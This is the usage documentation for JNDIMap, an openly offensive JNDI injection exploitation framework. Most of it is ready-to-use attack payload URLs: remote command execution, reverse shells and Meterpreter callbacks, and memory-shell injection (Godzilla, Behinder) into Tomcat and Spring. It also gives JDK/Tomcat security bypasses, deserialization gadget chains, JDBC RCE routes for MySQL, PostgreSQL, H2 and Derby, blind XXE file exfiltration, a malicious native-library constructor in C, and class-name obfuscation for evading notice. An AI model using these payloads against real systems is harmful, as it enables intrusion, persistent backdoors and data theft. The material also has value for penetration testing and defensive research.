# 📖 Documentation

[简体中文](USAGE.md) | English

## Usage

```bash
Usage: JNDIMap.jar [-hV] [--confusing-class-name] [--jshell]
                   [--use-reference-only] [-f=<file>] [-i=<ip>] [-j=<jks-path>]
                   [-k=<jks-pin>] [-l=<ldap-port>] [-p=<http-port>]
                   [-r=<rmi-port>] [-s=<ldaps-port>] [-u=<url>]
JNDI injection exploitation framework
  -i, --ip=<ip>              IP address (codebase) to listen on
                               Default: 127.0.0.1
  -r, --rmi-port=<rmi-port>  RMI server bind port
                               Default: 1099
  -l, --ldap-port=<ldap-port>
                             LDAP server bind port
                               Default: 1389
  -s, --ldaps-port=<ldaps-port>
                             LDAPS server bind port
                               Default: 1636
  -p, --http-port=<http-port>
                             HTTP server bind port
                               Default: 3456
  -u, --url=<url>            specify the JNDI route
  -j, --jks-path=<jks-path>  path to the JKS cert
  -k, --jks-pin=<jks-pin>    pin of the JKS cert
  -f, --file=<file>          path to the custom JS script
      --use-reference-only   directly returns Reference object through LDAP
                               related parameters
      --confusing-class-name use confusing class names when generating
                               malicious Java classes
      --jshell               use JShell to execute the payload instead of
                               Nashorn JS engine
  -h, --help                 Show this help message and exit.
  -V, --version              Print version information and exit.
```

`-i`: IP address to listen on (i.e. the codebase, must be specified as an IP that can be reached by the target, e.g. `192.168.1.100`, note that `0.0.0.0` is not available)

`-r`: RMI server bind port, default is `1099`

`-l`: LDAP server bind port, default is `1389`

`-s`: LDAPS server bind port, default is `1636`

`-p`: HTTP server bind port, default is `3456`

`-j`: path to the JKS cert, used to configure the LDAPS server

`-k`: pin of the JKS cert, no pin if not specified

`-u`: specify the JNDI route, e.g. `/Basic/Command/open -a Calculator` (The JNDI URL is not completely controllable in some cases)

`-f`: path to the custom JS script, used to write custom JNDI payloads

`--use-reference-only`: only applicable to LDAP protocol, directly returns Reference object through LDAP related parameters, used to bypass `com.sun.jndi.ldap.object.trustSerialData`

`--confusing-class-name`: use random fake class names when generating malicious Java classes, which are highly similar to real projects

`-h`: show help message

`-V`: show version information

## URL Format

Please note that all the Base64 passed in is **Base64 URL encoded**, i.e. replace `+` and `/` with `-` and `_`

Most parameters support automatic Base64 URL decoding, that is, you can directly pass in plain text (command/IP/port/URL) or Base64 URL encoded content (some routes only accept Base64 URL encoded parameters, which will be specially noted below)

The following routes support RMI, LDAP and LDAPS protocols except `/Deserialize/*` (LDAP deserialization)

For the RMI protocol, simply replace `ldap://127.0.0.1:1389/` with `rmi://127.0.0.1:1099/` in the payload url

For the LDAPS protocol, simply replace `ldap://127.0.0.1:1389/` with `ldaps://127.0.0.1:1636/` in the payload url

## Basic Functions

Directly load remote Java bytecode via JNDI Reference class 

The Java version must be less than 8u121 (RMI protocol) or 8u191 (LDAP protocol)

```bash
# DNS request
ldap://127.0.0.1:1389/Basic/DNSLog/xxx.dnslog.cn
ldap://127.0.0.1:1389/Basic/DNSLog/eHh4LmRuc2xvZy5jbg==

# execute command
ldap://127.0.0.1:1389/Basic/Command/open -a Calculator
ldap://127.0.0.1:1389/Basic/Command/b3BlbiAtYSBDYWxjdWxhdG9y

# load custom Java bytecode

# load via URL parameters
ldap://127.0.0.1:1389/Basic/FromUrl/<base64-url-encoded-java-bytecode>
# load from the server running JNDIMap
ldap://127.0.0.1:1389/Basic/FromFile/Evil.class # the path is relative to the current directory
ldap://127.0.0.1:1389/Basic/FromFile/<base64-url-encoded-path-to-evil-class-file>

# spawn reverse shell (supports Windows)
ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
ldap://127.0.0.1:1389/Basic/ReverseShell/MTI3LjAuMC4x/NDQ0NA==

# spawn Meterpreter (java/meterpreter/reverse_tcp)
ldap://127.0.0.1:1389/Basic/Meterpreter/127.0.0.1/4444
ldap://127.0.0.1:1389/Basic/Meterpreter/MTI3LjAuMC4x/NDQ0NA==
```

## MemShell Injection

Based on the [MemShellParty](https://github.com/ReaJason/MemShellParty) project

Currently only supports injecting memShells through Basic/BeanFactory/Deserialize routes

```bash
# Format
ldap://127.0.0.1:1389/Basic/MemShell/{server}/{tool}/{type}

# Tomcat Godzilla Filter
ldap://127.0.0.1:1389/Basic/MemShell/Tomcat/Godzilla/Filter
# Tomcat Godzilla Listener
ldap://127.0.0.1:1389/Basic/MemShell/Tomcat/Godzilla/Filter

# Spring Web MVC Behinder Interceptor
ldap://127.0.0.1:1389/Basic/MemShell/SpringWebMvc/Behinder/Interceptor
# Spring Web MVC Behinder Controller
ldap://127.0.0.1:1389/Basic/MemShell/SpringWebMvc/Behinder/ControllerHandler

# For more information on memory management types, see the MemShellParty README
```

## BeanFactory Bypass

Bypass restrictions on higher JDK versions using BeanFactory. The Tomcat version must be earlier than 8.5.79, 9.0.63, 10.0.21 or 10.1.0-M14

Supported bypass methods:

- Tomcat ELProcessor
- Groovy ClassLoader/Shell
- XStream
- SnakeYaml
- BeanShell
- MVEL
- MLet
- NativeLibLoader

*Except for MLet and NativeLibLoader, all of the above methods support all Basic module features.*

### Tomcat ELProcessor

Use `javax.el.ELProcessor` (Tomcat 8-9) or `jakarta.el.ELProcessor` (Tomcat 10) to execute EL expressions

```bash
# Tomcat Bypass (8-9)
ldap://127.0.0.1:1389/TomcatBypass/Command/open -a Calculator

# Tomcat Jakarta Bypass (10)
ldap://127.0.0.1:1389/TomcatJakartaBypass/Command/open -a Calculator
```

### Groovy ClassLoader/Shell

Use `groovy.lang.GroovyClassLoader` and `groovy.lang.GroovyShell` to execute Groovy scripts

```bash
# GroovyClassLoader
ldap://127.0.0.1:1389/GroovyClassLoader/Command/open -a Calculator

# GroovyShell
ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator
```

### XStream

Use XStream deserialization to achieve RCE (version <= 1.4.15)

The deserialization part uses UIDefaults + SwingLazyValue to trigger the following gadgets in sequence:

- Arbitrary file write: `com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename`
- XSLT Loading: `com.sun.org.apache.xalan.internal.xslt.Process._main`

The XSLT payload uses Spring's reflection library to call defineClass, so it requires a Spring environment

```bash
# XStream Bypass (depends on Spring)
# Based on arbitrary file write + XSLT loading, there is a probability of failure due to the order of precedence, so you need to try several times
ldap://127.0.0.1:1389/XStream/Command/open -a Calculator
```

### SnakeYaml

Use SnakeYaml deserialization to achieve RCE

The deserialization part uses URLClassLoader to load the `javax.script.ScriptEngineManager` SPI implementation class, which internally executes JavaScript code through the ScriptEngine

```bash
# SnakeYaml Bypass
ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator
```

### BeanShell

Use `bsh.Interpreter.eval` to execute BeanShell scripts

```bash
# BeanShell Bypass
ldap://127.0.0.1:1389/BeanShell/Command/open -a Calculator
```

### MVEL

Use `org.mvel2.sh.ShellSession.exec` to execute MVEL expressions

```bash
# MVEL Bypass
ldap://127.0.0.1:1389/MVEL/Command/open -a Calculator
```

### MLet

Use loadClass and addURL methods in `javax.management.loading.MLet` to detect classes in the classpath

If the class `com.example.TestClass` exists, the HTTP server will receive a `/com/example/TestClass_exists.class` request

```bash
# MLet
ldap://127.0.0.1:1389/MLet/com.example.TestClass
```

### NativeLibLoader

Use `com.sun.glass.utils.NativeLibLoader.loadLibrary` method to load the local library on the target server

You need to write a dll/so/dylib to the target machine in advance by other methods (e.g. file upload)

Please note that the path passed in is an absolute path and cannot contain the file extension

For example: if `/tmp/evil.so` exists on the server, the path is `/tmp/evil`

```bash
# NativeLibLoader
ldap://127.0.0.1:1389/NativeLibLoader/<base64-url-encoded-path-to-native-library>
```

source code of the native library, written in C

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void preload (void){
    system("open -a Calculator");
}
```

compile

```bash
# macOS
gcc -shared -fPIC exp.c -o exp.dylib

# Linux
gcc -shared -fPIC exp.c -o exp.so
```

## JDBC RCE

Support JDBC RCE for the following database connection pools

- Commons DBCP
- Tomcat DBCP
- Tomcat JDBC
- Alibaba Druid
- HikariCP

Replace the `Factory` in the URL with one of the following:

- CommonsDBCP1
- CommonsDBCP2
- TomcatDBCP1
- TomcatDBCP2
- TomcatJDBC
- Druid
- HikariCP

### MySQL

#### MySQL JDBC Deserialization RCE

```bash
# detectCustomCollations (5.1.19-5.1.48, 6.0.2-6.0.6)
ldap://127.0.0.1:1389/Factory/MySQL/Deserialize1/127.0.0.1/3306/root

# ServerStatusDiffInterceptor

# 5.1.11-5.1.48
ldap://127.0.0.1:1389/Factory/MySQL/Deserialize2/127.0.0.1/3306/root

# 6.0.2-6.0.6
ldap://127.0.0.1:1389/Factory/MySQL/Deserialize3/127.0.0.1/3306/root

# 8.0.7-8.0.19
ldap://127.0.0.1:1389/Factory/MySQL/Deserialize4/127.0.0.1/3306/root
```

JDBC URL (for reference)

```bash
# detectCustomCollations (5.1.19-5.1.48, 6.0.2-6.0.6)
jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=123

# ServerStatusDiffInterceptor

# 5.1.11-5.1.48
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=test

# 6.0.2-6.0.6
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=test

# 8.0.7-8.0.19
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=test
```

#### MySQL Client Arbitrary File Read

```bash
# all versions
ldap://127.0.0.1:1389/Factory/MySQL/FileRead/127.0.0.1/3306/root
```

JDBC URL (for reference)

```bash
# all versions
jdbc:mysql://127.0.0.1:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=655360
```

The above two methods require a malicious MySQL server to be used

[https://github.com/4ra1n/mysql-fake-server](https://github.com/4ra1n/mysql-fake-server)

[https://github.com/rmb122/rogue_mysql_server](https://github.com/rmb122/rogue_mysql_server)

[https://github.com/fnmsd/MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)

### PostgreSQL

Instantiate ClassPathXmlApplicationContext via the socketFactory and socketFactoryArg parameters of the PostgreSQL JDBC URL to achieve RCE

```bash
# execute command
ldap://127.0.0.1:1389/Factory/PostgreSQL/Command/open -a Calculator

# reverse shell
ldap://127.0.0.1:1389/Factory/PostgreSQL/ReverseShell/127.0.0.1/4444
```

### H2

Execute SQL statements via the INIT parameter of the H2 JDBC URL, support command execution and reverse shell

Support three methods: CREATE ALIAS + Java/Groovy, CREATE TRIGGER + JavaScript

```bash
# execute command
ldap://127.0.0.1:1389/Factory/H2/Java/Command/open -a Calculator
ldap://127.0.0.1:1389/Factory/H2/Groovy/Command/open -a Calculator
ldap://127.0.0.1:1389/Factory/H2/JavaScript/Command/open -a Calculator

# reverse shell
ldap://127.0.0.1:1389/Factory/H2/Java/ReverseShell/127.0.0.1/4444
ldap://127.0.0.1:1389/Factory/H2/Groovy/ReverseShell/127.0.0.1/4444
ldap://127.0.0.1:1389/Factory/H2/JavaScript/ReverseShell/127.0.0.1/4444
```

In addition, JNDIMap also supports H2 RCE in **JRE environment**

*Java 15 and above versions have deleted the Nashorn JS engine, and the JRE environment itself does not include the javac command, so the above Java/JavaScript method cannot be used to achieve RCE*

```bash
# Based on MidiSystem.getSoundbank method, only JRE + H2 dependency are required
ldap://127.0.0.1:1389/Factory/H2/JRE/Soundbank/Command/open -a Calculator
ldap://127.0.0.1:1389/Factory/H2/JRE/Soundbank/ReverseShell/127.0.0.1/4444

# based on ClassPathXmlApplicationContext, requires Spring dependency
ldap://127.0.0.1:1389/Factory/H2/JRE/Spring/Command/open -a Calculator
ldap://127.0.0.1:1389/Factory/H2/JRE/Spring/ReverseShell/127.0.0.1/4444
```

### Derby

#### Derby SQL RCE

Support executing commands and reverse shell

```bash
# 1. load remote jar and create procedures (will automatically create the database)
ldap://127.0.0.1:1389/Factory/Derby/Install/<database>

# 2. execute command/reverse shell
ldap://127.0.0.1:1389/Factory/Derby/Command/<database>/open -a Calculator
ldap://127.0.0.1:1389/Factory/Derby/ReverseShell/<database>/ReverseShell/127.0.0.1/4444

# 3. drop the database to release memory
ldap://127.0.0.1:1389/Factory/Derby/Drop/<database>
```

Please note that the connectionInitSql/initSQL parameter of HikariCP/TomcatJDBC does not support executing multiple SQL statements at once, so the **Install** process above needs to be written separately, taking HikariCP as an example

```bash
# 1. load remote jar (will automatically create the database)
ldap://127.0.0.1:1389/HikariCP/Derby/InstallJar/<database>

# 2. add the jar to the classpath
ldap://127.0.0.1:1389/HikariCP/Derby/AddClassPath/<database>

# 3. create a procedure to execute commands
ldap://127.0.0.1:1389/HikariCP/Derby/CreateCmdProc/<database>

# 4. create a procedure to execute reverse shell
ldap://127.0.0.1:1389/HikariCP/Derby/CreateRevProc/<database>

# subsequent JNDI URL is the same as above
```

In order to prevent malicious jars from landing, JNDIMap chooses to use the `jdbc:derby:memory:<database>` form of JDBC URL to create the database in memory

Therefore, it is best not to execute the Install/InstallJar route multiple times, and remember to Drop the database to release memory

#### Derby Master-Slave Replication Deserialization RCE

Although JNDI itself supports deserialization, it is not very meaningful, and may be useful in some extreme scenarios (e.g. filtering the LDAP protocol and only supporting RMI)

```bash
# 1. create an in-memory database
ldap://127.0.0.1:1389/Factory/Derby/Create/<database>

# 2. start the malicious Derby Server quickly using JNDIMap
java -cp JNDIMap.jar map.jndi.server.DerbyServer -g "/CommonsCollectionsK1/Command/open -a Calculator"

# 3. specify Slave information, database is the name of the database created above
ldap://127.0.0.1:1389/Factory/Derby/Slave/<ip>/<port>/<database>
```

Start the built-in malicious Derby Server

```bash
Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>] [-f <file>] [-h]
```

`-p`: Derby Server listening port, default is `4851`

`-g`: specify gadget, e.g. `/CommonsCollectionsK1/Command/open -a Calculator` (i.e. `/Deserialize/*` series routes)

`-f`: specify custom serialization data file

`-h`: show usage

## Tomcat Blind XXE

Use `org.apache.catalina.users.MemoryUserDatabaseFactory` to achieve Blind XXE

The path must be in Base64 URL format

```bash
# Tomcat XXE
ldap://127.0.0.1:1389/TomcatXXE/<base64-url-encoded-path>
```

Due to JDK limitations, XXE can only read single-line files that do not contain special characters. The file contents are sent to the built-in HTTP server as the `content` parameter

```bash
[LDAP] Received query: /TomcatXXE/L3RtcC90ZXN0LnR4dA==
[TomcatXXE] Path: /tmp/test.txt
[LDAP] Sending Reference object (serialized data)
[HTTP] Receive request: /O5GPr0d7.xml
[HTTP] Receive request: /TsBaggdL.dtd
[HTTP] Receive request: /V4J4ZH1P?content=helloworld
```

## LDAP Deserialization

Supports Java deserialization via LDAP and LDAP protocols (RMI protocol is not supported)

JNDIMap has built-in the following gadgets, and also supports custom data deserialization

- CommonsCollections K1-K4
- CommonsBeanutils183
- CommonsBeanutils194
- Fastjson1 (1.2.x)
- Fastjson2 (2.0.x)
- Jackson

```bash
# custom data deserialization

# load via URL parameters
ldap://127.0.0.1:1389/Deserialize/FromUrl/<base64-url-encoded-serialized-data>
# load from the server running JNDIMap
ldap://127.0.0.1:1389/Deserialize/FromFile/payload.ser # the path is relative to the current directory
ldap://127.0.0.1:1389/Deserialize/FromFile/<base64-url-encoded-path-to-serialized-data>

# CommonsCollectionsK1 deserialization (3.1 + TemplatesImpl), supports command execution, reverse shell and memshell injection
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/ReverseShell/127.0.0.1/4444
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/MemShell/Tomcat/Godzilla/Filter

# CommonsCollectionsK2 deserialization (4.0 + TemplatesImpl), same as above
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK2/Command/open -a Calculator

# CommonsCollectionsK3 deserialization (3.1 + Runtime.exec), only supports command execution
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/open -a Calculator

# CommonsCollectionsK4 deserialization (4.0 + Runtime.exec), same as above
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator

# CommonsBeanutils deserialization
# No need for commons-collections dependency, use TemplatesImpl, support command execution, reverse shell and memshell injection
# According to the different serialVersionUID of BeanComparator, it is divided into two versions: 1.8.3 and 1.9.4

# 1.8.3
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/ReverseShell/127.0.0.1/4444
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/MemShell/Tomcat/Godzilla/Filter

# 1.9.4
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/4444
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/MemShell/Tomcat/Godzilla/Filter

# Jackson deserialization
# Use JdkDynamicAopProxy to optimize instability issues, need spring-aop dependency
ldap://127.0.0.1:1389/Deserialize/Jackson/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/Jackson/ReverseShell/127.0.0.1/4444
ldap://127.0.0.1:1389/Deserialize/Jackson/MemShell/Tomcat/Godzilla/Filter

# Fastjson deserialization

# Fastjson1: all versions (1.2.x)
ldap://127.0.0.1:1389/Deserialize/Fastjson1/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/Fastjson1/ReverseShell/127.0.0.1/4444
ldap://127.0.0.1:1389/Deserialize/Fastjson1/MemShell/Tomcat/Godzilla/Filter

# Fastjson2: <= 2.0.26
ldap://127.0.0.1:1389/Deserialize/Fastjson2/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/Fastjson2/ReverseShell/127.0.0.1/4444
ldap://127.0.0.1:1389/Deserialize/Fastjson2/MemShell/Tomcat/Godzilla/Filter
```

## Script

JNDIMap supports writing custom JNDI payload scripts with the Nashorn JavaScript engine (based on ES5)

Take H2 RCE as an example

```javascript
var Reference = Java.type("javax.naming.Reference");
var StringRefAddr = Java.type("javax.naming.StringRefAddr");

var list = [];
list.push("CREATE ALIAS EXEC AS 'String cmd_exec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return \"test\";}'");
list.push("CALL EXEC('" + args + "')"); // parameters are passed in through the args variable

var url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=" + list.join(";") + ";";

var ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null);
ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
ref.add(new StringRefAddr("jdbcUrl", url));

ref; // return Reference object
```

Start JNDIMap

```bash
java -jar JNDIMap.jar -f /path/to/evil.js
```

Achieve RCE via the following JNDI URL

```bash
# supports passing parameters to JS script manually
ldap://127.0.0.1:1389/Script/<args>
```

In some cases, the JNDI URL is not completely controllable, so you can specify the `-u` parameter

```bash
java -jar JNDIMap.jar -f /path/to/evil.js -u "/Script/open -a Calculator"
```

Then trigger via any JNDI URL

```bash
ldap://127.0.0.1:1389/x
```

## Advanced Techniques

### Use Reference Only

For JNDI injection of the LDAP(s) protocol, if you want to use ObjectFactory to bypass it, the existing methods are to set the javaSerializedData attribute returned by the LDAP protocol to the serialized data of the Reference object

However, since JDK 21, the `com.sun.jndi.ldap.object.trustSerialData` parameter defaults to false, which means that deserialization cannot be triggered through the LDAP protocol, and the Reference object cannot be parsed through the above method

But we can still set the relevant LDAP parameters so that the server directly returns the Reference object. Because this process does not involve deserialization, it bypasses the restrictions of the trustSerialData parameter

The specific implementation is as follows

```java
public void processSearchResult(InMemoryInterceptedSearchResult searchResult) {
    // ......

    Reference ref = (Reference) result;
    e.addAttribute("objectClass", "javaNamingReference");
    e.addAttribute("javaClassName", ref.getClassName());
    e.addAttribute("javaFactory", ref.getFactoryClassName());

    Enumeration<RefAddr> enumeration = ref.getAll();
    int posn = 0;

    while (enumeration.hasMoreElements()) {
        StringRefAddr addr = (StringRefAddr) enumeration.nextElement();
        e.addAttribute("javaReferenceAddress", "#" + posn + "#" + addr.getType() + "#" + addr.getContent());
        posn ++;
    }

    // ......
}
```

Just specify the `--use-reference-only` parameter when using it

```bash
java -jar JNDIMap.jar --use-reference-only
```

### Confusing Class Name

The [classNames](src/main/resources/classNames) directory of JNDIMap contains some fake class names that are highly similar to real projects. These class names are generated based on the [ClassNameObfuscator](https://github.com/X1r0z/ClassNameObfuscator) project and can be used in scenarios related to generating malicious Java classes in JNDI injection

Just specify the `--confusing-class-name` parameter when using it

```bash
java -jar JNDIMap.jar --confusing-class-name
```

When the `--confusing-class-name` parameter is not specified, JNDIMap generates a random string in the format `[A-Z]{1}[A-Za-z0-9]{7}` as the malicious class name

### JShell Payload

Executes scripts using JShell (instead of the Nashorn JS Engine), available for JDK >= 15

Currently, supports Tomcat/Groovy/BeanShell/MVEL routes

Just specify the `--jshell` parameter when using it

```bash
java -jar JNDIMap.jar --jshell
```

*JShell starts a new process when running, so it is not possible to inject memory into it under this condition*
